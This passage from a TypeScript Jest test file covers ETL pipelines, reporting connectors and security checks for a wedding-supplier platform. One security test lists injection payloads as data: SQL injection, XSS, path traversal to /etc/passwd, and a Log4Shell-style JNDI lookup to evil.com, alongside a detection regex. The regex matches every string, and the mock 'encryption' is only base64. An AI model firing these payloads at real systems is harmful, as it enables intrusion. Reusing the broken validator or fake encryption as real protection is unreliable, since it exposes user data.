            endpoint: 'https://nonexistent-api.example.com/data',
          },
          extractionRules: {},
        },
        transformations: [
          {
            id: 'error_transform',
            name: 'Error Transform',
            type: 'custom' as const,
            order: 1,
            config: {},
          },
        ],
        destinations: [
          {
            type: 'database' as const,
            connectionId: 'test_db',
            config: {
              table: 'test_table',
              syncMode: 'append' as const,
            },
          },
        ],
        enabled: true,
        priority: 'low' as const,
        weddingSpecific: {
          dataType: 'mixed' as const,
          seasonalAdjustments: false,
          weddingDateAware: false,
          supplierTypeSpecific: false,
        },
        errorHandling: {
          onSourceError: 'fail' as const,
          onTransformationError: 'fail' as const,
          onDestinationError: 'fail' as const,
          maxErrors: 0,
          notificationThreshold: 0,
          quarantineInvalidData: false,
        },
        monitoring: {
          trackDataLineage: false,
          collectMetrics: true,
          logLevel: 'error' as const,
          alertOnFailure: true,
          alertOnSlowExecution: false,
          alertThresholds: {
            executionTimeMs: 30000,
            errorRate: 0.0,
            dataQualityScore: 100,
          },
        },
      };

      await etlManager.registerPipeline(errorPipeline);
      const execution = await etlManager.executePipeline(
        'error_pipeline',
        true,
      );

      expect(execution.status).toBe('failed');
      expect(execution.errors.length).toBeGreaterThan(0);
    });

    test('should generate system metrics', async () => {
      const metrics = etlManager.getSystemMetrics();

      expect(metrics).toHaveProperty('totalPipelines');
      expect(metrics).toHaveProperty('enabledPipelines');
      expect(metrics).toHaveProperty('runningExecutions');
      expect(metrics).toHaveProperty('successfulExecutionsToday');
      expect(metrics).toHaveProperty('failedExecutionsToday');
      expect(metrics).toHaveProperty('avgExecutionTimeMs');

      expect(typeof metrics.totalPipelines).toBe('number');
      expect(typeof metrics.avgExecutionTimeMs).toBe('number');
    });
  });

  describe('Wedding Data Transformations', () => {
    test('should standardize supplier types correctly', () => {
      const testData = [
        { supplier_type: 'photographer' },
        { supplier_type: 'wedding venue' },
        { supplier_type: 'DJ' },
        { supplier_type: 'unknown_type' },
      ];

      testData.forEach((item) => {
        const standardized = (etlManager as any).standardizeSupplierType(
          item.supplier_type,
        );

        switch (item.supplier_type) {
          case 'photographer':
            expect(standardized).toBe('Photography');
            break;
          case 'wedding venue':
            expect(standardized).toBe('Venue');
            break;
          case 'DJ':
            expect(standardized).toBe('Entertainment');
            break;
          case 'unknown_type':
            expect(standardized).toBe('unknown_type'); // Unchanged
            break;
        }
      });
    });

    test('should calculate wedding seasons correctly', () => {
      const seasonTests = [
        { month: 3, expected: 'Spring' },
        { month: 6, expected: 'Summer' },
        { month: 9, expected: 'Fall' },
        { month: 12, expected: 'Winter' },
      ];

      seasonTests.forEach((test) => {
        const season = (etlManager as any).getWeddingSeason(test.month);
        expect(season).toBe(test.expected);
      });
    });

    test('should validate wedding records correctly', async () => {
      const validRecord = {
        booking_id: 'booking_valid',
        couple_id: 'couple_valid',
        supplier_id: 'supplier_valid',
        wedding_date: '2024-08-15',
        contract_value: 2500.0,
        guest_count: 75,
      };

      const invalidRecord = {
        booking_id: '', // Invalid: empty
        couple_id: 'couple_test',
        supplier_id: 'supplier_test',
        wedding_date: 'invalid-date', // Invalid: bad format
        contract_value: -100, // Invalid: negative
        guest_count: 0, // Invalid: zero guests
      };

      const validResult = await (etlManager as any).validateWeddingRecord(
        validRecord,
        {
          dataType: 'bookings',
          weddingDateAware: true,
          seasonalAdjustments: false,
          supplierTypeSpecific: false,
        },
      );

      const invalidResult = await (etlManager as any).validateWeddingRecord(
        invalidRecord,
        {
          dataType: 'bookings',
          weddingDateAware: true,
          seasonalAdjustments: false,
          supplierTypeSpecific: false,
        },
      );

      expect(validResult.isValid).toBe(true);
      expect(validResult.errors).toHaveLength(0);

      expect(invalidResult.isValid).toBe(false);
      expect(invalidResult.errors.length).toBeGreaterThan(0);
    });
  });
});

/**
 * Security and Performance Tests
 * Tests for security, data integrity, and performance requirements
 */
describe('Security and Performance', () => {
  describe('Data Security', () => {
    test('should sanitize sensitive data in logs', () => {
      const sensitiveData = {
        supplier_id: 'supplier_123',
        business_name: 'Test Business',
        email: 'test@business.com',
        phone: '(555) 123-4567',
        credit_card: '4111111111111111', // Should be filtered
        ssn: '123-45-6789', // Should be filtered
        password: 'secret123', // Should be filtered
      };

      // Mock sanitization function
      const sanitizeForLogging = (data: any) => {
        const sanitized = { ...data };
        const sensitiveFields = [
          'credit_card',
          'ssn',
          'password',
          'token',
          'api_key',
        ];

        sensitiveFields.forEach((field) => {
          if (sanitized[field]) {
            sanitized[field] = '[REDACTED]';
          }
        });

        return sanitized;
      };

      const sanitized = sanitizeForLogging(sensitiveData);

      expect(sanitized.supplier_id).toBe('supplier_123');
      expect(sanitized.email).toBe('test@business.com');
      expect(sanitized.credit_card).toBe('[REDACTED]');
      expect(sanitized.ssn).toBe('[REDACTED]');
      expect(sanitized.password).toBe('[REDACTED]');
    });

    test('should validate input data to prevent injection attacks', () => {
      const maliciousInputs = [
        "'; DROP TABLE suppliers; --",
        "<script>alert('xss')</script>",
        '../../../../etc/passwd',
        '${jndi:ldap://evil.com/a}',
      ];

      const isValidInput = (input: string): boolean => {
        // Basic input validation rules
        const maliciousPatterns = [
          /('|(\\'))|(\\\\')|(;|\\\\;)|(\-\-)|(\s*$)|(\s*or\s*)|(\s*and\s*)/i,
          /<script|<iframe|javascript:|data:/i,
          /\.\./,
          /\$\{.*\}/,
        ];

        return !maliciousPatterns.some((pattern) => pattern.test(input));
      };

      maliciousInputs.forEach((input) => {
        expect(isValidInput(input)).toBe(false);
      });

      // Valid inputs should pass
      expect(isValidInput('Amazing Photography')).toBe(true);
      expect(isValidInput('supplier_123')).toBe(true);
    });

    test('should encrypt sensitive configuration data', () => {
      const sensitiveConfig = {
        database: {
          host: 'db.example.com',
          username: 'admin',
          password: 'secretpassword123',
        },
        apiKeys: {
          tableau: 'tableau_api_key_123',
          hubspot: 'hubspot_api_key_456',
        },
      };

      // Mock encryption function
      const encrypt = (data: string): string => {
        return Buffer.from(data).toString('base64') + '_encrypted';
      };

      const decrypt = (encryptedData: string): string => {
        return Buffer.from(
          encryptedData.replace('_encrypted', ''),
          'base64',
        ).toString();
      };

      // Encrypt sensitive fields
      const encryptedConfig = {
        ...sensitiveConfig,
        database: {
          ...sensitiveConfig.database,
          password: encrypt(sensitiveConfig.database.password),
        },
        apiKeys: {
          tableau: encrypt(sensitiveConfig.apiKeys.tableau),
          hubspot: encrypt(sensitiveConfig.apiKeys.hubspot),
        },
      };

      expect(encryptedConfig.database.password).not.toBe('secretpassword123');
      expect(encryptedConfig.database.password).toContain('_encrypted');

      // Verify decryption works
      const decryptedPassword = decrypt(encryptedConfig.database.password);
      expect(decryptedPassword).toBe('secretpassword123');
    });
  });

  describe('Performance Requirements', () => {
    test('should handle large datasets efficiently', async () => {
      // Create large mock dataset
      const largeDataset = Array.from({ length: 10000 }, (_, index) => ({
        supplier_id: `supplier_${index}`,
        business_name: `Business ${index}`,
        supplier_type: 'Photography',
        rating: 4.0 + Math.random(),
        created_at: new Date().toISOString(),
      }));

      const startTime = Date.now();

      // Mock processing function
      const processLargeDataset = (data: any[]) => {
        return data.map((item) => ({
          ...item,
          processed: true,
          processing_time: new Date().toISOString(),
        }));
      };

      const processedData = processLargeDataset(largeDataset);
      const processingTime = Date.now() - startTime;

      expect(processedData).toHaveLength(10000);
      expect(processingTime).toBeLessThan(1000); // Should process within 1 second
    });

    test('should implement efficient batch processing', async () => {
      const batchProcessor = {
        processBatch: async (data: any[], batchSize: number = 100) => {
          const batches = [];

          for (let i = 0; i < data.length; i += batchSize) {
            const batch = data.slice(i, i + batchSize);
            batches.push(batch);
          }

          // Simulate parallel processing
          const results = await Promise.all(
            batches.map(async (batch, index) => {
              // Simulate processing time
              await new Promise((resolve) => setTimeout(resolve, 10));
              return {
                batchIndex: index,
                recordsProcessed: batch.length,
                processingTime: 10,
              };
            }),
          );

          return results;
        },
      };

      const testData = Array.from({ length: 1000 }, (_, i) => ({ id: i }));
      const results = await batchProcessor.processBatch(testData, 100);

      expect(results).toHaveLength(10); // 1000 records / 100 batch size

      const totalRecords = results.reduce(
        (sum, result) => sum + result.recordsProcessed,
        0,
      );
      expect(totalRecords).toBe(1000);
    });

    test('should implement connection pooling for database operations', () => {
      class MockConnectionPool {
        private connections: any[] = [];
        private maxConnections: number;
        private activeConnections: number = 0;

        constructor(maxConnections: number = 10) {
          this.maxConnections = maxConnections;
        }

        async getConnection(): Promise<any> {
          if (this.activeConnections >= this.maxConnections) {
            throw new Error('Connection pool exhausted');
          }

          this.activeConnections++;
          return {
            id: `conn_${this.activeConnections}`,
            query: jest.fn().mockResolvedValue([]),
            release: () => {
              this.activeConnections--;
            },
          };
        }

        getActiveConnections(): number {
          return this.activeConnections;
        }

        getMaxConnections(): number {
          return this.maxConnections;
        }
      }

      const pool = new MockConnectionPool(5);

      expect(pool.getMaxConnections()).toBe(5);
      expect(pool.getActiveConnections()).toBe(0);

      // Test connection acquisition and release
      const conn1 = pool.getConnection();
      expect(pool.getActiveConnections()).toBe(1);
    });

    test('should implement caching for frequently accessed data', () => {
      class MockCache {
        private cache: Map<string, { data: any; expiry: number }> = new Map();
        private defaultTTL: number = 300000; // 5 minutes

        set(key: string, data: any, ttl?: number): void {
          const expiry = Date.now() + (ttl || this.defaultTTL);
          this.cache.set(key, { data, expiry });
        }

        get(key: string): any | null {
          const item = this.cache.get(key);

          if (!item) return null;

          if (Date.now() > item.expiry) {
            this.cache.delete(key);
            return null;
          }

          return item.data;
        }

        invalidate(key: string): void {
          this.cache.delete(key);
        }

        clear(): void {
          this.cache.clear();
        }

        size(): number {
          return this.cache.size;
        }
      }

      const cache = new MockCache();

      // Test cache operations
      cache.set('suppliers_list', mockWeddingData.suppliers);
      expect(cache.get('suppliers_list')).toEqual(mockWeddingData.suppliers);
      expect(cache.size()).toBe(1);

      // Test cache miss
      expect(cache.get('non_existent_key')).toBeNull();

      // Test cache invalidation
      cache.invalidate('suppliers_list');
      expect(cache.get('suppliers_list')).toBeNull();
      expect(cache.size()).toBe(0);
    });
  });
});

/**
 * End-to-End Integration Tests
 * Tests complete integration workflows from source to destination
 */
describe('End-to-End Integration Workflows', () => {
  let orchestrator: ReportingIntegrationOrchestrator;
  let healthMonitor: IntegrationHealthMonitor;
  let etlManager: ETLPipelineManager;

  beforeEach(async () => {
    orchestrator = new ReportingIntegrationOrchestrator({
      maxConcurrentRequests: 3,
      requestTimeoutMs: 30000,
      retryAttempts: 2,
      enableHealthMonitoring: true,
      dataValidationEnabled: true,
    });

    healthMonitor = new IntegrationHealthMonitor(testHealthMonitorConfig);
    etlManager = new ETLPipelineManager(testETLConfig);

    // Register mock connectors
    await orchestrator.registerConnector(
      'tableau',
      new MockTableauIntegration() as any,
    );
    await orchestrator.registerConnector(
      'hubspot',
      new MockHubSpotIntegration() as any,
    );
    await orchestrator.registerConnector(
      'snowflake',
      new MockSnowflakeIntegration() as any,
    );
  });

  afterEach(async () => {
    await healthMonitor.stopMonitoring();
    await orchestrator.disconnect?.();
  });

  test('should complete full wedding data integration workflow', async () => {
    // Step 1: Extract wedding supplier data
    const supplierData = mockWeddingData.suppliers;

    // Step 2: Transform data for different destinations
    const tableauData = supplierData.map((supplier) => ({
      ...supplier,
      formatted_for_tableau: true,
    }));

    const hubspotData = supplierData.map((supplier) => ({
      email: supplier.email,
      firstname: supplier.business_name.split(' ')[0],
      lastname: supplier.business_name.split(' ').slice(1).join(' '),
      company: supplier.business_name,
      phone: supplier.phone,
      supplier_type: supplier.supplier_type,
    }));

    // Step 3: Load data to multiple destinations
    const syncResults = await Promise.all([
      orchestrator.synchronizeData('tableau', {
        sourceSystem: 'wedsync',
        targetTable: 'suppliers',
        data: tableauData,
        syncMode: 'append',
      }),
      orchestrator.synchronizeData('hubspot', {
        sourceSystem: 'wedsync',
        targetTable: 'contacts',
        data: hubspotData,
        syncMode: 'upsert',
      }),
      orchestrator.synchronizeData('snowflake', {
        sourceSystem: 'wedsync',
        targetTable: 'dim_suppliers',
        data: supplierData,
        syncMode: 'upsert',
      }),
    ]);

    // Verify all syncs succeeded
    expect(syncResults).toEqual([true, true, true]);
  });

  test('should handle wedding booking data pipeline end-to-end', async () => {
    // Create comprehensive wedding booking pipeline
    const bookingPipeline = {
      id: 'e2e_booking_pipeline',
      name: 'End-to-End Wedding Booking Pipeline',
      description: 'Complete booking data processing workflow',
      source: {
        type: 'manual' as const,
        connectionId: 'wedsync_source',
        config: {},
        extractionRules: {},
      },
      transformations: [
        {
          id: 'wedding_enrichment',
          name: 'Wedding Data Enrichment',
          type: 'enrichment' as const,
          order: 1,
          config: {
            enrichmentRules: [
              {
                type: 'calculation',
                config: { outputField: 'days_until_wedding' },
              },
            ],
          },
          weddingBusinessRules: {
            validateWeddingDates: true,
            enrichWithSeasonalData: true,
            calculateRevenue: true,
          },
        },
        {
          id: 'data_cleaning',
          name: 'Data Cleaning and Validation',
          type: 'cleaning' as const,
          order: 2,
          config: {
            cleaningRules: [
              { field: 'booking_status', cleaningType: 'standardize_status' },
              { field: 'contract_value', cleaningType: 'validate_currency' },
            ],
          },
        },
      ],
      destinations: [
        {
          type: 'database' as const,
          connectionId: 'snowflake_dw',
          config: {
            table: 'fact_bookings',
            syncMode: 'upsert' as const,
          },
        },
      ],
      enabled: true,
      priority: 'high' as const,
      weddingSpecific: {
        dataType: 'bookings' as const,
        seasonalAdjustments: true,
        weddingDateAware: true,
        supplierTypeSpecific: true,
      },
      errorHandling: {
        onSourceError: 'retry' as const,
        onTransformationError: 'log_and_continue' as const,
        onDestinationError: 'retry' as const,
        maxErrors: 5,
        notificationThreshold: 3,
        quarantineInvalidData: true,
      },
      monitoring: {
        trackDataLineage: true,
        collectMetrics: true,
        logLevel: 'info' as const,
        alertOnFailure: true,
        alertOnSlowExecution: true,
        alertThresholds: {
          executionTimeMs: 300000,
          errorRate: 0.02,
          dataQualityScore: 90,
        },
      },
    };

    // Register and execute pipeline
    await etlManager.registerPipeline(bookingPipeline);

    // Mock data extraction
    (etlManager as any).extractFromManual = jest
      .fn()
      .mockResolvedValue(mockWeddingData.bookings);

    const execution = await etlManager.executePipeline(
      'e2e_booking_pipeline',
      true,
    );

    expect(execution.status).toBe('completed');
    expect(execution.recordsProcessed).toBe(1);
    expect(execution.errors).toHaveLength(0);
  });

  test('should handle integration health monitoring during data sync', async () => {
    // Register integrations for health monitoring
    const integrations = [
      {
        id: 'tableau_e2e',
        name: 'Tableau E2E',
        type: 'bi_platform' as const,
        priority: 'high' as const,
        connector: new MockTableauIntegration(),
        isEnabled: true,
      },
      {
        id: 'hubspot_e2e',
        name: 'HubSpot E2E',
        type: 'crm' as const,
        priority: 'critical' as const,
        connector: new MockHubSpotIntegration(),
        isEnabled: true,
      },
    ];

    integrations.forEach((integration) => {
      healthMonitor.registerIntegration(integration as any);
    });

    // Start health monitoring
    await healthMonitor.startMonitoring();

    // Perform data synchronization while monitoring
    const syncPromises = integrations.map(async (integration) => {
      await integration.connector.connect();
      return orchestrator.synchronizeData(integration.id, {
        sourceSystem: 'wedsync',
        targetTable: 'test_data',
        data: mockWeddingData.suppliers.slice(0, 1),
        syncMode: 'append',
      });
    });

    const results = await Promise.all(syncPromises);

    // Verify syncs completed successfully
    expect(results).toEqual([true, true]);

    // Check health monitoring captured the activity
    const systemOverview = healthMonitor.getSystemOverview();
    expect(systemOverview.totalIntegrations).toBe(2);
    expect(systemOverview.healthyIntegrations).toBe(2);
  });

  test('should recover from failures and complete workflow', async () => {
    // Create a connector that fails first but recovers
    let attemptCount = 0;
    const unreliableConnector = {
      connect: jest.fn().mockResolvedValue(undefined),
      disconnect: jest.fn().mockResolvedValue(undefined),
      getHealthStatus: jest.fn().mockImplementation(() => {
        attemptCount++;
        if (attemptCount <= 2) {
          return Promise.resolve({
            isHealthy: false,
            error: 'Temporary failure',
            lastChecked: new Date(),
            responseTimeMs: 5000,
          });
        }
        return Promise.resolve({
          isHealthy: true,
          lastChecked: new Date(),
          responseTimeMs: 200,
        });
      }),
      syncData: jest.fn().mockImplementation(() => {
        if (attemptCount <= 2) {
          return Promise.reject(new Error('Sync failed'));
        }
        return Promise.resolve(true);
      }),
    };

    // Register unreliable connector
    await orchestrator.registerConnector(
      'unreliable_test',
      unreliableConnector as any,
    );

    healthMonitor.registerIntegration({
      id: 'unreliable_test',
      name: 'Unreliable Test',
      type: 'bi_platform',
      priority: 'high',
      connector: unreliableConnector,
      isEnabled: true,
    } as any);

    // Start monitoring and attempt recovery
    await healthMonitor.startMonitoring();

    // First health check should detect failure
    await healthMonitor.performHealthCheck('unreliable_test');
    let alerts = healthMonitor.getUnresolvedAlerts();
    expect(alerts.length).toBeGreaterThan(0);

    // Force consecutive failures to trigger recovery
    const integration = healthMonitor.getIntegrationStatus('unreliable_test');
    if (integration) {
      integration.consecutiveFailures = 3;
    }

    // Attempt recovery - should succeed on third try
    const recoveryResult = await healthMonitor.attemptRecovery(
      'unreliable_test',
      'automatic',
    );
    expect(recoveryResult).toBe(true);

    // Verify integration is now healthy
    const healthStatus =
      await healthMonitor.performHealthCheck('unreliable_test');
    expect(healthStatus.isHealthy).toBe(true);
  });

  test('should validate data quality across the entire pipeline', async () => {
    // Create data with various quality issues
    const problematicData = [
      {
        supplier_id: 'supplier_001',
        business_name: 'Valid Business',
        supplier_type: 'Photography',
        rating: 4.5,
        email: 'valid@email.com',
      },
      {
        supplier_id: '', // Missing required field
        business_name: 'Invalid Business 1',
        supplier_type: 'Photography',
        rating: 4.5,
        email: 'invalid@email.com',
      },
      {
        supplier_id: 'supplier_002',
        business_name: 'Invalid Business 2',
        supplier_type: 'Photography',
        rating: 10.0, // Invalid rating
        email: 'not-an-email', // Invalid email format
      },
    ];

    // Mock comprehensive data validation function
    const validateDataQuality = (data: any[]) => {
      const results = {
        validRecords: [] as any[],
        invalidRecords: [] as any[],
        qualityScore: 0,
        issues: [] as string[],
      };

      data.forEach((record, index) => {
        const recordIssues: string[] = [];

        // Required field validation
        if (!record.supplier_id) recordIssues.push('Missing supplier_id');
        if (!record.business_name) recordIssues.push('Missing business_name');

        // Data type validation
        if (record.rating && (record.rating < 1 || record.rating > 5)) {
          recordIssues.push('Invalid rating range');
        }

        // Format validation
        if (record.email && !record.email.includes('@')) {
          recordIssues.push('Invalid email format');
        }

        if (recordIssues.length === 0) {
          results.validRecords.push(record);
        } else {
          results.invalidRecords.push({ ...record, _issues: recordIssues });
          results.issues.push(`Record ${index}: ${recordIssues.join(', ')}`);
        }
      });

      results.qualityScore = (results.validRecords.length / data.length) * 100;
      return results;
    };

    const qualityResults = validateDataQuality(problematicData);

    expect(qualityResults.validRecords).toHaveLength(1);
    expect(qualityResults.invalidRecords).toHaveLength(2);
    expect(qualityResults.qualityScore).toBeCloseTo(33.33);
    expect(qualityResults.issues).toHaveLength(2);
  });
});

/**
 * Test Utilities and Helpers
 */
export const TestUtilities = {
  // Generate mock wedding data
  generateMockWeddingData: (count: number = 10) => {
    const supplierTypes = [
      'Photography',
      'Venue',
      'Catering',
      'Floral',
      'Entertainment',
    ];
    const locations = [
      'Los Angeles, CA',
      'San Francisco, CA',
      'New York, NY',
      'Chicago, IL',
      'Austin, TX',
    ];

    return Array.from({ length: count }, (_, index) => ({
      supplier_id: `supplier_${String(index + 1).padStart(3, '0')}`,
      business_name: `Wedding Business ${index + 1}`,
      supplier_type: supplierTypes[index % supplierTypes.length],
      location: locations[index % locations.length],
      rating: 4.0 + Math.random(),
      years_in_business: 1 + Math.floor(Math.random() * 20),
      pricing_tier: ['Budget', 'Mid-range', 'Luxury'][
        Math.floor(Math.random() * 3)
      ],
      phone: `(555) ${String(Math.floor(Math.random() * 900) + 100)}-${String(Math.floor(Math.random() * 9000) + 1000)}`,
      email: `business${index + 1}@example.com`,
      website: `https://business${index + 1}.com`,
      is_active: Math.random() > 0.1, // 90% active
      created_at: new Date(
        Date.now() - Math.random() * 365 * 24 * 60 * 60 * 1000,
      ).toISOString(),
      updated_at: new Date().toISOString(),
    }));
  },

  // Simulate network delays for testing
  simulateNetworkDelay: (
    minMs: number = 50,
    maxMs: number = 500,
  ): Promise<void> => {
    const delay = Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
    return new Promise((resolve) => setTimeout(resolve, delay));
  },

  // Create mock API responses
  createMockAPIResponse: (data: any, statusCode: number = 200) => ({
    ok: statusCode >= 200 && statusCode < 300,
    status: statusCode,
    statusText: statusCode === 200 ? 'OK' : 'Error',
    json: () => Promise.resolve(data),
    text: () => Promise.resolve(JSON.stringify(data)),
  }),

  // Validate integration configuration
  validateIntegrationConfig: (
    config: any,
  ): { isValid: boolean; errors: string[] } => {
    const errors: string[] = [];

    if (!config.id) errors.push('Missing integration ID');
    if (!config.name) errors.push('Missing integration name');
    if (!config.type) errors.push('Missing integration type');
    if (!config.connector) errors.push('Missing connector implementation');

    return {
      isValid: errors.length === 0,
      errors,
    };
  },
};

// Export test data and utilities for use in other test files
export { mockWeddingData, testHealthMonitorConfig, testETLConfig };
